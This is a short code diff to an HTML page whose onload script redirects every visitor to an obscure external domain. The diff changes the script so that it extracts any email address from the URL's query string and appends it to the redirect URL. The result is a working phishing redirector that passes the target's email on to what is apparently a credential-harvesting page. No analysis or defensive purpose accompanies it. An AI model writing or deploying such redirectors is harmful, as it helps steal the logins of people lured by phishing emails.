@@ -3,17 +3,15 @@
 <head>
   <script>
     window.onload = function () {
-      const urlParams = new URLSearchParams(window.location.search);
-      const refParam = urlParams.get('ref');
+      const query = window.location.search;
+      const emailRegex = /[?&][^=]*=([^&]*@[^&]*)/i; // Look for any parameter containing an email
 
-      if (refParam !== null) {
-        const fullQuery = window.location.search;
-        const refIndex = fullQuery.indexOf('?ref=');
-        if (refIndex !== -1) {
-          const afterRef = fullQuery.substring(refIndex + 5); // only skip "?ref=" (5 chars)
-          const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + afterRef;
-          window.location.href = targetUrl;
-        }
+      const match = query.match(emailRegex);
+      const email = match ? decodeURIComponent(match[1]) : null;
+
+      if (email) {
+        const targetUrl = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/*' + email;
+        window.location.href = targetUrl;
       } else {
         window.location.href = 'https://tkifyuz1p.vyhppakr.es/zyRrtf@sKcX2WC/';
       }
